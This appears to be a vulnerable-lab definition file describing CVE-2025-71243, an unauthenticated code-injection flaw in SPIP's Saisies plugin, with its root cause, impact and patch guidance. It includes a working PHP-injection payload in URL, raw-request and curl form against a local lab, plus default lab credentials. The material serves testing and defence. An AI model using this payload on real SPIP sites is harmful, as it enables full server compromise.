@@ -1,0 +1,134 @@
+id: vt-2025-71243
+
+info:
+  name: "SPIP Saisies Plugin - Unauthenticated Remote Code Execution"
+  author: omarkurt
+  description: |
+    The 'Saisies pour formulaire' plugin for SPIP contains a critical unauthenticated
+    Remote Code Execution vulnerability. The _anciennes_valeurs parameter bypasses SPIP's
+    protege_champ() sanitization due to its underscore prefix, and the #ACTION_FORMULAIRE
+    balise renders with interdire_scripts=false, allowing injected PHP tags to survive
+    template compilation and execute via eval() during the form loading phase.
+  targets:
+    - spip
+    - saisies
+    - php
+  type: CVE
+  cve: CVE-2025-71243
+  cwe: CWE-94
+  cvss:
+    score: 9.8
+    severity: critical
+    metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+  affected_versions:
+    - "Saisies plugin >= 5.4.0, < 5.11.1"
+  fixed_version: "5.11.1"
+  tags:
+    - spip
+    - saisies
+    - rce
+    - code-injection
+    - template-injection
+    - unauthenticated
+    - php
+    - cve-2025-71243
+
+owasp:
+  - "A03:2021 - Injection"
+
+references:
+  - https://vulnerability.circl.lu/vuln/cve-2025-71243
+  - https://blog.spip.net/Mise-a-jour-critique-de-securite-pour-le-plugin-Saisies.html
+  - https://plugins.spip.net/saisies
+  - https://chocapikk.com/posts/2026/spip-saisies-rce/
+  - https://github.com/Chocapikk/CVE-2025-71243
+  - https://www.vulncheck.com/advisories/spip-saisies-plugin-remote-code-execution
+
+vulnerabilities:
+  - id: spip-saisies-rce
+    name: "SPIP Saisies _anciennes_valeurs PHP Code Injection"
+    description: |
+      The function saisies_formulaire_charger_generer_hidden_ancienne_valeur_depubliee()
+      in saisies_pipelines.php directly interpolates user-supplied _anciennes_valeurs
+      parameter into an HTML hidden input value attribute without any sanitization:
+        return "<input type='hidden' name='_anciennes_valeurs' value='$encode' />";
+      Combined with interdire_scripts=false on #ACTION_FORMULAIRE, injected PHP tags
+      execute during SPIP template compilation via eval().
+    endpoint: /spip.php?page=contact
+    method: GET
+    param: _anciennes_valeurs
+    authentication:
+      type: none
+      required: false
+    payloads:
+      - name: "RCE via PHP tag injection"
+        value: "_anciennes_valeurs=x' /><?php system('id'); ?><input value='x"
+        expected_output: "uid=33(www-data)"
+    request: |
+      GET /spip.php?page=contact&_anciennes_valeurs=x%27%2F%3E%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E%3Cinput%20value%3D%27x HTTP/1.1
+      Host: {{Hostname}}
+    response: |
+      HTTP/1.1 200 OK
+      Content-Type: text/html; charset=UTF-8
+    indicators:
+      success:
+        - "uid="
+        - "www-data"
+
+technical: |
+  Three layers combine to enable code execution:
+  1. Field Bypass: Parameters prefixed with underscore (_anciennes_valeurs) bypass
+     protege_champ() sanitization because the code checks if ($champ[0] !== '_')
+     before applying protections.
+  2. Template Security Disabled: The #ACTION_FORMULAIRE balise renders the _hidden
+     field with interdire_scripts=false, disabling PHP tag stripping that normally
+     replaces <?  with &lt;?.
+  3. Code Execution: SPIP templates compile to PHP and execute via eval().
+     Unescaped <?php ?> tags survive compilation and execute during rendering.
+
+  Affected components:
+  - saisies_pipelines.php: saisies_formulaire_charger_generer_hidden_ancienne_valeur_depubliee()
+  - SPIP template engine (eval-based compilation)
+  - #ACTION_FORMULAIRE balise (interdire_scripts=false)
+
+impact: |
+  Successful exploitation allows an unauthenticated remote attacker to execute arbitrary
+  system commands with the privileges of the web server process (www-data). This can lead to:
+  - Complete server compromise
+  - Data exfiltration from the database and filesystem
+  - Installation of web shells or backdoors
+  - Lateral movement within the network
+  - Website defacement
+
+remedy: |
+  1. Immediately update the Saisies plugin to version 5.11.1 or later
+  2. If update is not possible, temporarily disable the Saisies plugin
+  3. Implement WAF rules to block _anciennes_valeurs parameter containing PHP tags
+  4. Regular security patching of SPIP core and all plugins
+  5. Input validation on all form parameters regardless of underscore prefix
+  6. Monitor SPIP security advisories at blog.spip.net
+
+poc:
+  nuclei:
+    - "vt-2025-71243.nuclei.yaml"
+  manual:
+    steps:
+      - "Start lab: docker-compose up -d"
+      - "Wait for initialization (~60s)"
+      - "Send exploit payload to the form page"
+  curl_examples:
+    - name: "RCE via _anciennes_valeurs injection"
+      command: |
+        curl -s "http://localhost:8025/spip.php?page=contact&_anciennes_valeurs=x%27%2F%3E%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E%3Cinput%20value%3D%27x"
+    - name: "Detection check (non-destructive)"
+      command: |
+        curl -s "http://localhost:8025/spip.php?page=contact&_anciennes_valeurs=x%27%2F%3E%3C%3Fphp%20echo%20%27VT_RCE_CHECK%27%3B%20%3F%3E%3Cinput%20value%3D%27x" | grep -o "VT_RCE_CHECK"
+
+providers:
+  docker-compose:
+    path: "docker-compose.yaml"
+
+post-install:
+  - "Access web interface at http://localhost:8025/"
+  - "Admin panel at http://localhost:8025/ecrire/ (admin / admin123)"
+  - "Vulnerable contact form at http://localhost:8025/spip.php?page=contact"
